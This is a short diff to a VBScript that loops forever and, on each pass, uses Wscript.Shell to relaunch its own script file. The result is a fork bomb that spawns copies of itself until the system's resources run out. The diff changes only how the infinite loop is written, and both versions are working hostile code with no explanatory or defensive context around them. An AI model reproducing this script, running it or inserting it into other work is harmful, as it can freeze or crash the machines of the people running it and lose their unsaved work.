@@ -1,3 +1,3 @@
-Do until true = false
+Do While True 
  CreateObject("Wscript.Shell").Run Wscript.ScriptName
 Loop
